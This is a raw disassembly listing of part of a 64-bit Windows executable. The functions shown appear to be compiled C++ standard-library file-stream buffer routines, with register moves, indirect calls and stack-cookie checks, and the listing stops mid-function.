   140006a97:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   140006a9e:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140006aa3:	ff 15 1f 3a 00 00    	call   *0x3a1f(%rip)        # 0x14000a4c8
   140006aa9:	85 c0                	test   %eax,%eax
   140006aab:	75 3b                	jne    0x140006ae8
   140006aad:	48 8b 46 10          	mov    0x10(%rsi),%rax
   140006ab1:	48 8b cf             	mov    %rdi,%rcx
   140006ab4:	48 89 47 74          	mov    %rax,0x74(%rdi)
   140006ab8:	e8 73 f4 ff ff       	call   0x140005f30
   140006abd:	48 8b 4f 74          	mov    0x74(%rdi),%rcx
   140006ac1:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140006ac6:	48 89 03             	mov    %rax,(%rbx)
   140006ac9:	48 8b c3             	mov    %rbx,%rax
   140006acc:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   140006ad3:	00 
   140006ad4:	48 89 4b 10          	mov    %rcx,0x10(%rbx)
   140006ad8:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140006add:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140006ae2:	48 83 c4 20          	add    $0x20,%rsp
   140006ae6:	5f                   	pop    %rdi
   140006ae7:	c3                   	ret
   140006ae8:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140006aed:	33 c0                	xor    %eax,%eax
   140006aef:	48 c7 03 ff ff ff ff 	movq   $0xffffffffffffffff,(%rbx)
   140006af6:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   140006afd:	00 
   140006afe:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140006b02:	48 8b c3             	mov    %rbx,%rax
   140006b05:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140006b0a:	48 83 c4 20          	add    $0x20,%rsp
   140006b0e:	5f                   	pop    %rdi
   140006b0f:	c3                   	ret
   140006b10:	40 53                	rex push %rbx
   140006b12:	56                   	push   %rsi
   140006b13:	57                   	push   %rdi
   140006b14:	41 56                	push   %r14
   140006b16:	48 83 ec 28          	sub    $0x28,%rsp
   140006b1a:	45 8b f1             	mov    %r9d,%r14d
   140006b1d:	48 8b da             	mov    %rdx,%rbx
   140006b20:	48 8b f1             	mov    %rcx,%rsi
   140006b23:	41 f6 c1 01          	test   $0x1,%r9b
   140006b27:	74 0a                	je     0x140006b33
   140006b29:	f6 41 70 04          	testb  $0x4,0x70(%rcx)
   140006b2d:	74 04                	je     0x140006b33
   140006b2f:	b1 01                	mov    $0x1,%cl
   140006b31:	eb 02                	jmp    0x140006b35
   140006b33:	32 c9                	xor    %cl,%cl
   140006b35:	41 f6 c6 02          	test   $0x2,%r14b
   140006b39:	74 0a                	je     0x140006b45
   140006b3b:	f6 46 70 02          	testb  $0x2,0x70(%rsi)
   140006b3f:	74 04                	je     0x140006b45
   140006b41:	b0 01                	mov    $0x1,%al
   140006b43:	eb 02                	jmp    0x140006b47
   140006b45:	32 c0                	xor    %al,%al
   140006b47:	48 89 6c 24 50       	mov    %rbp,0x50(%rsp)
   140006b4c:	4c 89 6c 24 60       	mov    %r13,0x60(%rsp)
   140006b51:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140006b56:	84 c9                	test   %cl,%cl
   140006b58:	0f 85 c9 00 00 00    	jne    0x140006c27
   140006b5e:	84 c0                	test   %al,%al
   140006b60:	0f 85 c1 00 00 00    	jne    0x140006c27
   140006b66:	49 8b 68 08          	mov    0x8(%r8),%rbp
   140006b6a:	48 8b ce             	mov    %rsi,%rcx
   140006b6d:	49 03 28             	add    (%r8),%rbp
   140006b70:	ff 15 fa 35 00 00    	call   *0x35fa(%rip)        # 0x14000a170
   140006b76:	f6 46 70 02          	testb  $0x2,0x70(%rsi)
   140006b7a:	4c 8b e8             	mov    %rax,%r13
   140006b7d:	74 04                	je     0x140006b83
   140006b7f:	33 ff                	xor    %edi,%edi
   140006b81:	eb 1b                	jmp    0x140006b9e
   140006b83:	48 8b ce             	mov    %rsi,%rcx
   140006b86:	ff 15 f4 35 00 00    	call   *0x35f4(%rip)        # 0x14000a180
   140006b8c:	48 8b f8             	mov    %rax,%rdi
   140006b8f:	48 85 c0             	test   %rax,%rax
   140006b92:	74 0a                	je     0x140006b9e
   140006b94:	48 39 46 68          	cmp    %rax,0x68(%rsi)
   140006b98:	73 04                	jae    0x140006b9e
   140006b9a:	48 89 46 68          	mov    %rax,0x68(%rsi)
   140006b9e:	48 8b ce             	mov    %rsi,%rcx
   140006ba1:	ff 15 c1 35 00 00    	call   *0x35c1(%rip)        # 0x14000a168
   140006ba7:	4c 8b 4e 68          	mov    0x68(%rsi),%r9
   140006bab:	4c 8b f8             	mov    %rax,%r15
   140006bae:	49 8b c9             	mov    %r9,%rcx
   140006bb1:	48 2b c8             	sub    %rax,%rcx
   140006bb4:	48 3b e9             	cmp    %rcx,%rbp
   140006bb7:	77 6e                	ja     0x140006c27
   140006bb9:	48 85 ed             	test   %rbp,%rbp
   140006bbc:	74 16                	je     0x140006bd4
   140006bbe:	41 f6 c6 01          	test   $0x1,%r14b
   140006bc2:	74 05                	je     0x140006bc9
   140006bc4:	4d 85 ed             	test   %r13,%r13
   140006bc7:	74 5e                	je     0x140006c27
   140006bc9:	41 f6 c6 02          	test   $0x2,%r14b
   140006bcd:	74 05                	je     0x140006bd4
   140006bcf:	48 85 ff             	test   %rdi,%rdi
   140006bd2:	74 53                	je     0x140006c27
   140006bd4:	4c 89 64 24 58       	mov    %r12,0x58(%rsp)
   140006bd9:	4c 8d 24 28          	lea    (%rax,%rbp,1),%r12
   140006bdd:	41 f6 c6 01          	test   $0x1,%r14b
   140006be1:	74 14                	je     0x140006bf7
   140006be3:	4d 85 ed             	test   %r13,%r13
   140006be6:	74 0f                	je     0x140006bf7
   140006be8:	4d 8b c4             	mov    %r12,%r8
   140006beb:	49 8b d7             	mov    %r15,%rdx
   140006bee:	48 8b ce             	mov    %rsi,%rcx
   140006bf1:	ff 15 a1 35 00 00    	call   *0x35a1(%rip)        # 0x14000a198
   140006bf7:	41 f6 c6 02          	test   $0x2,%r14b
   140006bfb:	74 20                	je     0x140006c1d
   140006bfd:	48 85 ff             	test   %rdi,%rdi
   140006c00:	74 1b                	je     0x140006c1d
   140006c02:	48 8b ce             	mov    %rsi,%rcx
   140006c05:	ff 15 95 35 00 00    	call   *0x3595(%rip)        # 0x14000a1a0
   140006c0b:	4d 8b c4             	mov    %r12,%r8
   140006c0e:	49 8b d7             	mov    %r15,%rdx
   140006c11:	4c 8b c8             	mov    %rax,%r9
   140006c14:	48 8b ce             	mov    %rsi,%rcx
   140006c17:	ff 15 b3 35 00 00    	call   *0x35b3(%rip)        # 0x14000a1d0
   140006c1d:	4c 8b 64 24 58       	mov    0x58(%rsp),%r12
   140006c22:	48 89 2b             	mov    %rbp,(%rbx)
   140006c25:	eb 07                	jmp    0x140006c2e
   140006c27:	48 c7 03 ff ff ff ff 	movq   $0xffffffffffffffff,(%rbx)
   140006c2e:	4c 8b 7c 24 20       	mov    0x20(%rsp),%r15
   140006c33:	33 c0                	xor    %eax,%eax
   140006c35:	4c 8b 6c 24 60       	mov    0x60(%rsp),%r13
   140006c3a:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   140006c3f:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   140006c46:	00 
   140006c47:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140006c4b:	48 8b c3             	mov    %rbx,%rax
   140006c4e:	48 83 c4 28          	add    $0x28,%rsp
   140006c52:	41 5e                	pop    %r14
   140006c54:	5f                   	pop    %rdi
   140006c55:	5e                   	pop    %rsi
   140006c56:	5b                   	pop    %rbx
   140006c57:	c3                   	ret
   140006c58:	cc                   	int3
   140006c59:	cc                   	int3
   140006c5a:	cc                   	int3
   140006c5b:	cc                   	int3
   140006c5c:	cc                   	int3
   140006c5d:	cc                   	int3
   140006c5e:	cc                   	int3
   140006c5f:	cc                   	int3
   140006c60:	40 53                	rex push %rbx
   140006c62:	56                   	push   %rsi
   140006c63:	48 83 ec 48          	sub    $0x48,%rsp
   140006c67:	33 f6                	xor    %esi,%esi
   140006c69:	4d 8b c8             	mov    %r8,%r9
   140006c6c:	48 8b d9             	mov    %rcx,%rbx
   140006c6f:	48 85 d2             	test   %rdx,%rdx
   140006c72:	75 0b                	jne    0x140006c7f
   140006c74:	4d 85 c0             	test   %r8,%r8
   140006c77:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140006c7d:	74 03                	je     0x140006c82
   140006c7f:	44 8b c6             	mov    %esi,%r8d
   140006c82:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140006c89:	48 85 c9             	test   %rcx,%rcx
   140006c8c:	0f 84 a3 00 00 00    	je     0x140006d35
   140006c92:	ff 15 50 38 00 00    	call   *0x3850(%rip)        # 0x14000a4e8
   140006c98:	85 c0                	test   %eax,%eax
   140006c9a:	0f 85 95 00 00 00    	jne    0x140006d35
   140006ca0:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   140006ca5:	48 8b cb             	mov    %rbx,%rcx
   140006ca8:	48 8b bb 80 00 00 00 	mov    0x80(%rbx),%rdi
   140006caf:	c6 43 7c 01          	movb   $0x1,0x7c(%rbx)
   140006cb3:	40 88 73 71          	mov    %sil,0x71(%rbx)
   140006cb7:	ff 15 2b 35 00 00    	call   *0x352b(%rip)        # 0x14000a1e8
   140006cbd:	48 85 ff             	test   %rdi,%rdi
   140006cc0:	74 4e                	je     0x140006d10
   140006cc2:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   140006cc7:	48 89 74 24 70       	mov    %rsi,0x70(%rsp)
   140006ccc:	4c 8d 44 24 68       	lea    0x68(%rsp),%r8
   140006cd1:	48 89 74 24 68       	mov    %rsi,0x68(%rsp)
   140006cd6:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140006cdb:	48 89 74 24 60       	mov    %rsi,0x60(%rsp)
   140006ce0:	48 8b cf             	mov    %rdi,%rcx
   140006ce3:	ff 15 1f 38 00 00    	call   *0x381f(%rip)        # 0x14000a508
   140006ce9:	4c 8b 4c 24 60       	mov    0x60(%rsp),%r9
   140006cee:	48 8b cb             	mov    %rbx,%rcx
   140006cf1:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   140006cf6:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   140006cfb:	4c 89 4c 24 30       	mov    %r9,0x30(%rsp)
   140006d00:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   140006d05:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140006d0a:	ff 15 e0 34 00 00    	call   *0x34e0(%rip)        # 0x14000a1f0
   140006d10:	48 89 bb 80 00 00 00 	mov    %rdi,0x80(%rbx)
   140006d17:	48 8b 05 d2 c2 00 00 	mov    0xc2d2(%rip),%rax        # 0x140012ff0
   140006d1e:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140006d23:	48 89 43 74          	mov    %rax,0x74(%rbx)
   140006d27:	48 8b c3             	mov    %rbx,%rax
   140006d2a:	48 89 73 68          	mov    %rsi,0x68(%rbx)
   140006d2e:	48 83 c4 48          	add    $0x48,%rsp
   140006d32:	5e                   	pop    %rsi
   140006d33:	5b                   	pop    %rbx
   140006d34:	c3                   	ret
   140006d35:	33 c0                	xor    %eax,%eax
   140006d37:	48 83 c4 48          	add    $0x48,%rsp
   140006d3b:	5e                   	pop    %rsi
   140006d3c:	5b                   	pop    %rbx
   140006d3d:	c3                   	ret
   140006d3e:	cc                   	int3
   140006d3f:	cc                   	int3
   140006d40:	40 53                	rex push %rbx
   140006d42:	48 83 ec 20          	sub    $0x20,%rsp
   140006d46:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   140006d4d:	00 
   140006d4e:	48 8b d9             	mov    %rcx,%rbx
   140006d51:	74 2d                	je     0x140006d80
   140006d53:	48 8b 01             	mov    (%rcx),%rax
   140006d56:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   140006d5b:	ff 50 18             	call   *0x18(%rax)
   140006d5e:	83 f8 ff             	cmp    $0xffffffff,%eax
   140006d61:	74 1d                	je     0x140006d80
   140006d63:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   140006d6a:	ff 15 88 37 00 00    	call   *0x3788(%rip)        # 0x14000a4f8
   140006d70:	33 c9                	xor    %ecx,%ecx
   140006d72:	85 c0                	test   %eax,%eax
   140006d74:	0f 99 c1             	setns  %cl
   140006d77:	8d 41 ff             	lea    -0x1(%rcx),%eax
   140006d7a:	48 83 c4 20          	add    $0x20,%rsp
   140006d7e:	5b                   	pop    %rbx
   140006d7f:	c3                   	ret
   140006d80:	33 c0                	xor    %eax,%eax
   140006d82:	48 83 c4 20          	add    $0x20,%rsp
   140006d86:	5b                   	pop    %rbx
   140006d87:	c3                   	ret
   140006d88:	cc                   	int3
   140006d89:	cc                   	int3
   140006d8a:	cc                   	int3
   140006d8b:	cc                   	int3
   140006d8c:	cc                   	int3
   140006d8d:	cc                   	int3
   140006d8e:	cc                   	int3
   140006d8f:	cc                   	int3
   140006d90:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140006d95:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140006d9a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140006d9f:	55                   	push   %rbp
   140006da0:	41 54                	push   %r12
   140006da2:	41 55                	push   %r13
   140006da4:	41 56                	push   %r14
   140006da6:	41 57                	push   %r15
   140006da8:	48 8b ec             	mov    %rsp,%rbp
   140006dab:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140006db2:	48 8b 05 07 be 00 00 	mov    0xbe07(%rip),%rax        # 0x140012bc0
   140006db9:	48 33 c4             	xor    %rsp,%rax
   140006dbc:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140006dc0:	4c 8b f9             	mov    %rcx,%r15
   140006dc3:	ff 15 a7 33 00 00    	call   *0x33a7(%rip)        # 0x14000a170
   140006dc9:	48 85 c0             	test   %rax,%rax
   140006dcc:	74 2b                	je     0x140006df9
   140006dce:	49 8b cf             	mov    %r15,%rcx
   140006dd1:	ff 15 b1 33 00 00    	call   *0x33b1(%rip)        # 0x14000a188
   140006dd7:	48 8b d8             	mov    %rax,%rbx
   140006dda:	49 8b cf             	mov    %r15,%rcx
   140006ddd:	ff 15 8d 33 00 00    	call   *0x338d(%rip)        # 0x14000a170
   140006de3:	48 3b c3             	cmp    %rbx,%rax
   140006de6:	73 11                	jae    0x140006df9
   140006de8:	49 8b cf             	mov    %r15,%rcx
   140006deb:	ff 15 bf 33 00 00    	call   *0x33bf(%rip)        # 0x14000a1b0
   140006df1:	0f b6 00             	movzbl (%rax),%eax
   140006df4:	e9 14 03 00 00       	jmp    0x14000710d
   140006df9:	49 83 bf 80 00 00 00 	cmpq   $0x0,0x80(%r15)
   140006e00:	00 
   140006e01:	75 0a                	jne    0x140006e0d
   140006e03:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140006e08:	e9 00 03 00 00       	jmp    0x14000710d
   140006e0d:	49 8b cf             	mov    %r15,%rcx
   140006e10:	ff 15 52 33 00 00    	call   *0x3352(%rip)        # 0x14000a168
   140006e16:	49 8d 4f 70          	lea    0x70(%r15),%rcx
   140006e1a:	48 3b c1             	cmp    %rcx,%rax
   140006e1d:	75 1a                	jne    0x140006e39
   140006e1f:	49 8b 97 88 00 00 00 	mov    0x88(%r15),%rdx
   140006e26:	4d 8b 8f 90 00 00 00 	mov    0x90(%r15),%r9
   140006e2d:	4c 8b c2             	mov    %rdx,%r8
   140006e30:	49 8b cf             	mov    %r15,%rcx
   140006e33:	ff 15 5f 33 00 00    	call   *0x335f(%rip)        # 0x14000a198
   140006e39:	49 8b 8f 80 00 00 00 	mov    0x80(%r15),%rcx
   140006e40:	49 83 7f 68 00       	cmpq   $0x0,0x68(%r15)
   140006e45:	75 1c                	jne    0x140006e63
   140006e47:	ff 15 cb 36 00 00    	call   *0x36cb(%rip)        # 0x14000a518
   140006e4d:	83 f8 ff             	cmp    $0xffffffff,%eax
   140006e50:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   140006e55:	0f 84 b0 02 00 00    	je     0x14000710b
   140006e5b:	0f b6 d8             	movzbl %al,%ebx
   140006e5e:	e9 a8 02 00 00       	jmp    0x14000710b
   140006e63:	0f 57 c0             	xorps  %xmm0,%xmm0
   140006e66:	0f 11 45 d8          	movups %xmm0,-0x28(%rbp)
   140006e6a:	48 c7 45 e8 00 00 00 	movq   $0x0,-0x18(%rbp)
   140006e71:	00 
   140006e72:	48 c7 45 f0 0f 00 00 	movq   $0xf,-0x10(%rbp)
   140006e79:	00 
   140006e7a:	c6 45 d8 00          	movb   $0x0,-0x28(%rbp)
   140006e7e:	ff 15 94 36 00 00    	call   *0x3694(%rip)        # 0x14000a518
   140006e84:	83 f8 ff             	cmp    $0xffffffff,%eax
   140006e87:	44 8b e0             	mov    %eax,%r12d
   140006e8a:	0f 84 25 02 00 00    	je     0x1400070b5
   140006e90:	48 ba ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rdx
   140006e97:	ff ff 7f 
   140006e9a:	48 8b 75 e8          	mov    -0x18(%rbp),%rsi
   140006e9e:	4c 8b 75 f0          	mov    -0x10(%rbp),%r14
   140006ea2:	49 3b f6             	cmp    %r14,%rsi
   140006ea5:	73 27                	jae    0x140006ece
   140006ea7:	48 8d 46 01          	lea    0x1(%rsi),%rax
   140006eab:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140006eaf:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140006eb3:	49 83 fe 0f          	cmp    $0xf,%r14
   140006eb7:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   140006ebc:	44 88 24 30          	mov    %r12b,(%rax,%rsi,1)
   140006ec0:	c6 44 30 01 00       	movb   $0x0,0x1(%rax,%rsi,1)
   140006ec5:	48 8b 7d d8          	mov    -0x28(%rbp),%rdi
   140006ec9:	e9 c4 00 00 00       	jmp    0x140006f92
   140006ece:	48 8b c2             	mov    %rdx,%rax
   140006ed1:	48 2b c6             	sub    %rsi,%rax
   140006ed4:	48 83 f8 01          	cmp    $0x1,%rax
   140006ed8:	0f 82 5c 02 00 00    	jb     0x14000713a
   140006ede:	4c 8d 6e 01          	lea    0x1(%rsi),%r13
   140006ee2:	49 8b dd             	mov    %r13,%rbx
   140006ee5:	48 83 cb 0f          	or     $0xf,%rbx
   140006ee9:	48 3b da             	cmp    %rdx,%rbx
   140006eec:	76 05                	jbe    0x140006ef3
   140006eee:	48 8b da             	mov    %rdx,%rbx
   140006ef1:	eb 21                	jmp    0x140006f14
   140006ef3:	49 8b ce             	mov    %r14,%rcx
   140006ef6:	48 d1 e9             	shr    $1,%rcx
   140006ef9:	48 8b c2             	mov    %rdx,%rax
   140006efc:	48 2b c1             	sub    %rcx,%rax
   140006eff:	4c 3b f0             	cmp    %rax,%r14
   140006f02:	76 05                	jbe    0x140006f09
   140006f04:	48 8b da             	mov    %rdx,%rbx
   140006f07:	eb 0b                	jmp    0x140006f14
   140006f09:	49 8d 04 0e          	lea    (%r14,%rcx,1),%rax
   140006f0d:	48 3b d8             	cmp    %rax,%rbx
   140006f10:	48 0f 42 d8          	cmovb  %rax,%rbx
   140006f14:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   140006f18:	e8 a3 a3 ff ff       	call   0x1400012c0
   140006f1d:	48 8b f8             	mov    %rax,%rdi
   140006f20:	4c 89 6d e8          	mov    %r13,-0x18(%rbp)
   140006f24:	48 89 5d f0          	mov    %rbx,-0x10(%rbp)
   140006f28:	4c 8b c6             	mov    %rsi,%r8
   140006f2b:	48 8b c8             	mov    %rax,%rcx
   140006f2e:	49 83 fe 0f          	cmp    $0xf,%r14
   140006f32:	76 48                	jbe    0x140006f7c
   140006f34:	48 8b 5d d8          	mov    -0x28(%rbp),%rbx
   140006f38:	48 8b d3             	mov    %rbx,%rdx
   140006f3b:	e8 04 27 00 00       	call   0x140009644
   140006f40:	44 88 24 3e          	mov    %r12b,(%rsi,%rdi,1)
   140006f44:	c6 44 3e 01 00       	movb   $0x0,0x1(%rsi,%rdi,1)
   140006f49:	49 8d 56 01          	lea    0x1(%r14),%rdx
   140006f4d:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140006f54:	72 1c                	jb     0x140006f72
   140006f56:	48 83 c2 27          	add    $0x27,%rdx
   140006f5a:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   140006f5e:	48 2b d8             	sub    %rax,%rbx
   140006f61:	48 83 eb 08          	sub    $0x8,%rbx
   140006f65:	48 83 fb 1f          	cmp    $0x1f,%rbx
   140006f69:	0f 87 d2 00 00 00    	ja     0x140007041
   140006f6f:	48 8b d8             	mov    %rax,%rbx
   140006f72:	48 8b cb             	mov    %rbx,%rcx
   140006f75:	e8 5e 18 00 00       	call   0x1400087d8
   140006f7a:	eb 12                	jmp    0x140006f8e
   140006f7c:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   140006f80:	e8 bf 26 00 00       	call   0x140009644
   140006f85:	44 88 24 3e          	mov    %r12b,(%rsi,%rdi,1)
   140006f89:	c6 44 3e 01 00       	movb   $0x0,0x1(%rsi,%rdi,1)
   140006f8e:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
   140006f92:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   140006f96:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   140006f9b:	48 0f 47 d7          	cmova  %rdi,%rdx
   140006f9f:	4c 8d 45 d8          	lea    -0x28(%rbp),%r8
   140006fa3:	4c 0f 47 c7          	cmova  %rdi,%r8
   140006fa7:	4c 8b 4d e8          	mov    -0x18(%rbp),%r9
   140006fab:	4c 03 ca             	add    %rdx,%r9
   140006fae:	49 8d 57 74          	lea    0x74(%r15),%rdx
   140006fb2:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   140006fb6:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140006fbb:	48 8d 45 c1          	lea    -0x3f(%rbp),%rax
   140006fbf:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140006fc4:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   140006fc8:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140006fcd:	48 8d 45 c8          	lea    -0x38(%rbp),%rax
   140006fd1:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006fd6:	49 8b 4f 68          	mov    0x68(%r15),%rcx
   140006fda:	ff 15 48 31 00 00    	call   *0x3148(%rip)        # 0x14000a128
   140006fe0:	85 c0                	test   %eax,%eax
   140006fe2:	74 05                	je     0x140006fe9
   140006fe4:	83 e8 01             	sub    $0x1,%eax
   140006fe7:	75 72                	jne    0x14000705b
   140006fe9:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   140006fed:	48 8b 5d e8          	mov    -0x18(%rbp),%rbx
   140006ff1:	48 39 45 d0          	cmp    %rax,-0x30(%rbp)
   140006ff5:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140006ff9:	75 78                	jne    0x140007073
   140006ffb:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   140007000:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   140007005:	4c 8b 4d c8          	mov    -0x38(%rbp),%r9
   140007009:	4c 2b c8             	sub    %rax,%r9
   14000700c:	49 3b d9             	cmp    %r9,%rbx
   14000700f:	4c 0f 42 cb          	cmovb  %rbx,%r9
   140007013:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   140007017:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   14000701c:	48 0f 47 4d d8       	cmova  -0x28(%rbp),%rcx
   140007021:	49 2b d9             	sub    %r9,%rbx
   140007024:	4c 8d 43 01          	lea    0x1(%rbx),%r8
   140007028:	49 8d 14 09          	lea    (%r9,%rcx,1),%rdx
   14000702c:	e8 19 26 00 00       	call   0x14000964a
   140007031:	48 89 5d e8          	mov    %rbx,-0x18(%rbp)
   140007035:	49 8b 8f 80 00 00 00 	mov    0x80(%r15),%rcx
   14000703c:	e9 3d fe ff ff       	jmp    0x140006e7e
   140007041:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140007048:	00 00 
   14000704a:	45 33 c9             	xor    %r9d,%r9d
   14000704d:	45 33 c0             	xor    %r8d,%r8d
   140007050:	33 d2                	xor    %edx,%edx
   140007052:	33 c9                	xor    %ecx,%ecx
   140007054:	ff 15 0e 34 00 00    	call   *0x340e(%rip)        # 0x14000a468
   14000705a:	cc                   	int3
   14000705b:	83 f8 02             	cmp    $0x2,%eax
   14000705e:	75 55                	jne    0x1400070b5
   140007060:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140007064:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   140007069:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   14000706e:	0f be 18             	movsbl (%rax),%ebx
   140007071:	eb 47                	jmp    0x1400070ba
   140007073:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   140007078:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   14000707d:	48 8b 4d c8          	mov    -0x38(%rbp),%rcx
   140007081:	48 2b d9             	sub    %rcx,%rbx
   140007084:	48 03 d8             	add    %rax,%rbx
   140007087:	48 85 db             	test   %rbx,%rbx
   14000708a:	7e 23                	jle    0x1400070af
   14000708c:	0f 1f 40 00          	nopl   0x0(%rax)
   140007090:	48 ff cb             	dec    %rbx
   140007093:	0f be 0c 0b          	movsbl (%rbx,%rcx,1),%ecx
   140007097:	49 8b 97 80 00 00 00 	mov    0x80(%r15),%rdx
   14000709e:	ff 15 34 34 00 00    	call   *0x3434(%rip)        # 0x14000a4d8
   1400070a4:	48 85 db             	test   %rbx,%rbx
   1400070a7:	7e 06                	jle    0x1400070af
   1400070a9:	48 8b 4d c8          	mov    -0x38(%rbp),%rcx
   1400070ad:	eb e1                	jmp    0x140007090
   1400070af:	0f b6 5d c0          	movzbl -0x40(%rbp),%ebx
   1400070b3:	eb 05                	jmp    0x1400070ba
   1400070b5:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   1400070ba:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
   1400070be:	48 83 fa 0f          	cmp    $0xf,%rdx
   1400070c2:	76 47                	jbe    0x14000710b
   1400070c4:	48 ff c2             	inc    %rdx
   1400070c7:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
   1400070cb:	48 8b c1             	mov    %rcx,%rax
   1400070ce:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400070d5:	72 2f                	jb     0x140007106
   1400070d7:	48 83 c2 27          	add    $0x27,%rdx
   1400070db:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400070df:	48 2b c1             	sub    %rcx,%rax
   1400070e2:	48 83 e8 08          	sub    $0x8,%rax
   1400070e6:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400070ea:	76 1a                	jbe    0x140007106
   1400070ec:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400070f3:	00 00 
   1400070f5:	45 33 c9             	xor    %r9d,%r9d
   1400070f8:	45 33 c0             	xor    %r8d,%r8d
   1400070fb:	33 d2                	xor    %edx,%edx
   1400070fd:	33 c9                	xor    %ecx,%ecx
   1400070ff:	ff 15 63 33 00 00    	call   *0x3363(%rip)        # 0x14000a468
   140007105:	cc                   	int3
   140007106:	e8 cd 16 00 00       	call   0x1400087d8
   14000710b:	8b c3                	mov    %ebx,%eax
   14000710d:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   140007111:	48 33 cc             	xor    %rsp,%rcx
   140007114:	e8 57 17 00 00       	call   0x140008870
   140007119:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   140007120:	00 
   140007121:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   140007125:	49 8b 73 40          	mov    0x40(%r11),%rsi
   140007129:	49 8b 7b 48          	mov    0x48(%r11),%rdi
   14000712d:	49 8b e3             	mov    %r11,%rsp
   140007130:	41 5f                	pop    %r15
   140007132:	41 5e                	pop    %r14
   140007134:	41 5d                	pop    %r13
   140007136:	41 5c                	pop    %r12
   140007138:	5d                   	pop    %rbp
   140007139:	c3                   	ret
   14000713a:	e8 c1 ab ff ff       	call   0x140001d00
   14000713f:	90                   	nop
   140007140:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007145:	57                   	push   %rdi
   140007146:	48 83 ec 20          	sub    $0x20,%rsp
   14000714a:	48 8b f9             	mov    %rcx,%rdi
   14000714d:	ff 15 1d 30 00 00    	call   *0x301d(%rip)        # 0x14000a170
   140007153:	48 85 c0             	test   %rax,%rax
   140007156:	74 31                	je     0x140007189
   140007158:	48 8b cf             	mov    %rdi,%rcx
   14000715b:	ff 15 27 30 00 00    	call   *0x3027(%rip)        # 0x14000a188
   140007161:	48 8b cf             	mov    %rdi,%rcx
   140007164:	48 8b d8             	mov    %rax,%rbx
   140007167:	ff 15 03 30 00 00    	call   *0x3003(%rip)        # 0x14000a170
   14000716d:	48 3b c3             	cmp    %rbx,%rax
   140007170:	73 17                	jae    0x140007189
   140007172:	48 8b cf             	mov    %rdi,%rcx
   140007175:	ff 15 f5 2f 00 00    	call   *0x2ff5(%rip)        # 0x14000a170
   14000717b:	0f b6 00             	movzbl (%rax),%eax
   14000717e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
